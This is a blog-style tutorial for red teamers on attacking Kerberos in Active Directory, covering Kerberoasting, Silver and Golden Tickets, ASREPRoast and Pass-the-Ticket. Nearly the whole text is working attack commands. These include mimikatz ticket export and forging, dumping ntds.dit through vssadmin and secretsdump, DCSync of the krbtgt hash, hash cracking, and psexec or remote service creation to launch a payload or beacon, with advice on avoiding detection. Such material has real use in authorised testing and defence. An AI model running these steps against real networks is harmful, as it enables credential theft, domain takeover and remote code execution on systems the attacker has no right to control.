In pentest/red team operations, it's pretty normal abuse kerberos, in a lateral movement
process, even in horizontal movement we can abuse kerberos... But, a lot hackers have
trouble abusing kerberos. Thinking about that, we write this post to help these hackers.
We hope you learn something by reading us :)

First of all, kerberos is a bit complex, and attacks around it can also be a bit confusing,
we'll clarify as much as possible these attacks...

<b>-------------------------------------- Kerberoasting -----------------------------------------</b>

The Kerberoasting attack, maybe, one of the most beautiful attacks around kerberos, allows you
to move horizontally through your compromised host, the beauty of this attack that you don't
need a high-privileged user, if you've a low-privileged user you can kerberoast.

This attack basically consists of starting from a low-privileged user, get a ticket to
impersonate a high-privileged user, but, the user that you need to request needs to be
"kerberoastable", this means the target account must have one or more SPNs.

To identify a kerberoastable user, you can use Bloodhound (not recommended due high traffic),
or list SPNs, using impacket toolkit or with powershell modules... Many ways to list SPNs.

A simple way to list SPNs is using <a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1">GetUsersSPNs.ps1</a>

.\GetUserSPNs.ps1

And, knowing the kerberoastable users (with one or more SPNs), we just need to kerberoast,
requesting a ticket to impersonate any SPN user. Of course, over time, several automated
ways to kerberoast emerged. 

Manually, you need to use KerberosRequestorSecurityToken after enumerate SPNs

Add-Type -AssemblyName System.IdentityModel
New-Object SystemIdentityModel.Tokens.KerberosRequestorSecurtiyToken -ArgumentList *spn_user*

After request, you can easily export all tickets by using mimikatz and crack them
using john, hashcat or other crack tool...

mimikatz # kerberos::list /export

kirbi2john.py ticket.kirbi >ticket.hash
john --wordlist=dict.txt ticket.hash


But, we can kerberoast with automated powershell modules, Impacket toolkit, Rubeus, Empire...

Impacket: 
./GetUserSPNs.py -request-user *spn_user* -hashes lm:ntlm -dc-ip *ip* domain/compromised_username 

Powershell Empire (Invoke-Kerberoast):
import-Module Invoke-Kerberoast.ps1
Invoke-Kerberoast

Rubeus:
.\Rubeus.exe kerberoast /outfile:kerberoasted.hashes


And when you crack ticket, you can finally psexec...

./psexec.py domain/user:pass@ip

<b>-------------------------------------- Silver Ticket -----------------------------------------</b>

The silver ticket attack grants to hacker access to any service running in the compromised machine,
once you've compromised a SPN user (e.g by kerberoasting), you're able to silver ticket...

When you're in a red team operation, for example, you've tasks that you complete, a silver ticket
might be a good idea since they have great potential in a horizontal movement, or, for data exfiltration
purposes...

However, lets talk about the actual attack. 

First of all, you need the NTLM hash of SPN user that you've compromised, if you haven't the NTLM hash,
you can easily convert plaintext password to ntlm by using powershell.

Import-Module DSInternals
ConvertTo-NTHash 'password'

And, you also need the Domain SID which you can easily identify by using a powershell single command

Get-ADDomain | Select-String -Pattern "DomainSID"

Now, we are ready to silver ticket... But, before we start attack, we need to know how this attack
works. Basically, since kerberos allows services to login since they have a valid ticket, when hacker, 
with an SPN privilege, create a forged service ticket (silver ticket) and use it to impersonate the
target service...

We can easily silver ticket by using <a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>

mimikatz # kerberos::golden /sid:sid /domain:domain_name /ptt (pass-the-ticket, we'll talk about it later) 
/target:hostname /service:mssql (e.g) /rc4:ntlm_hash /user:FakeUser /id:1111

mimikatz # misc::cmd 

After launch cmd, you can run klist command and you'll see the ticket is already impersonated.
Then you can just access and manage the target service...

<b>-------------------------------------- Golden Ticket -----------------------------------------</b>

The golden ticket attack is problably the most powerfull attack around kerberos. The golden ticket,
provide to you access to any resource connected in AD (Active Directory), once you have the krbtgt
hash, that you can get by hashdumping domain controller.

A safe way to dump the ntds.dit file and get krbtgt hash, is to create a volume shadow (vss) and
and extract ntds.dit from shadow volume, you can also use mimikatz to easily dump krbtgt hash, but,
of course, mimikatz is normally detected...

vssadmin create shadow /for=C:
copy \\?\NAME\Windows\ntds\ntds.dit C:\temp\ntds.dit
copy \\?\NAME\Windows\System32\config\SYSTEM C:\temp\SYSTEM
vssadmin delete shadows /shadow={?-?-?-?-?}

After extract ntds.dit file and SYSTEM registry, you can easily dump it locally by using impacket
toolkit (secretsdump.py)

secretsdump.py  -system SYSTEM -ntds ntds.dit LOCAL

If you're in a safe environment, you can easily dump krbtgt by using mimikatz

mimikatz # lsadump::dcsync /domain:domain /user:krbtgt

You will also need Domain SID and Domain Name.

Get-ADDomain

Now, you're able to golden ticket, and the process is almost the same of silver ticket. But,
with krbtgt user, we can generate TGTs instead TGSs, and a TGT signed by krbtgt can access any
resource connected to AD, which takes this attack to another different proportion than silver
ticket...

Its pretty easy impersonate the golden ticket by using Mimikatz

mimikatz # kerberos::golden /domain:domain.name /sid:sid /rc4:krbtgtHash /id:1111 /user:FakeUser
mimikatz # kerberos::ptt ticket.kirbi
mimikatz # misc::cmd

And after launch cmd, you shold have your golden ticket impersonated. And, with a golden
ticket impersonated, you already can psexec, or drop and execute your payload...

PsExec.exe \\mail cmd.exe

Or generate a service payload and

sc \\dc01 create pwn binpath=C:\path\to\your\payload.exe[SC] CreateService SUCCESS
sc \\dc01 start pwn

And your beacon/meterpreter or any agent that you are using, should be running in the
target machine

-------------------------------------- ASREPRoast -----------------------------------------

The attack consists of looking for users without the need for kerberos pre-authentication,
that is, users with the DONT_REQ_PREAUTH attribute set. This means that any user can send 
an AS_REQ, which is a request for a TGT made to the KDC (Key Distribution Center) on 
behalf of any of these users and receiving an AS_REP message, which send TGT by KDC.

In the same message, it contains a piece of data encrypted with the hash of an original 
user, resulting from his password, so we can use the hash to crack the offline users
password.

No domain account is required to carry out the attack. However, with an account in the 
domain, one way to get users who don't need  pre-authentication is to perform an LDAP 
query, using the following filter:

(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))

Without a domain account, we can use the GetNPUsers.py script on a linux machine so 
that we can collect AS_REP responses from users with the DONT_REQ_PREAUTH attribute set on 
their account. We will pass a given list of usernames to get the list of users giving the 
domain name, like this:

(x3h):~# python GetNPUsers.py dn1.local/ -usersfile users.txt -format hashcat 
-outputfile hashes.asreproast

Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation
[-] User example1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User example2 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
(x3h):~# cat hashes.asreproast 
$krb5asrep$23$example1@DN1.LOCAL:7c2e70d3d46b4794b95.............

After receiving the AS_REP along with the users hash, we can crack it using hashcat.
Note: on a windows machine, you can use the Rubeus tool to carry out the attack. 

-------------------------------------- Pass-The-Ticket -----------------------------------------

Let us now understand the concept of ptt (pass the ticket), and how it can be useful... We
already see how to kerberoast, but, the kerberoasting attack could might be effective if
we crack the ticket and get plaintext password... But this ins't interesting for us,
the ptt came to solve this problem.

We already talk and did ptt attacks in this same post, and well, the ptt attack basically consists
of using the ticket as password, we just need the ticket to login, without having to crack the
ticket, or relying on dictionary attacks...

In this same post, we used ptt for load the ticket into memory (impersonated it) by using mimikatz, 
but, in a kerberoasting attack, will be a bit more complex, because we cant use mimikatz, and we
don't have how to remote ptt with kirbi file without mimikatz, or other automated tool... But,
using Impacket toolkit we can pass the ticket doing other process.

First of all, we need to kerberoast and export tickets by using powershell and mimikatz

.\GetUserSPNs.ps1

Add-Type -AssemblyName System.IdentityModel
New-Object SystemIdentityModel.Tokens.KerberosRequestorSecurtiyToken -ArgumentList *spn_user*

mimikatz # kerberos::list /export

Now, you need to download your ticket.kirbi and we will pass the ticket by using Impacket

./kirbi2ccache ticket.kirbi ticket.ccache
export KRB5CCNAME=/path/to/ticket.ccache; ./psexec -k -no-pass domain.local/spn_user@dc01
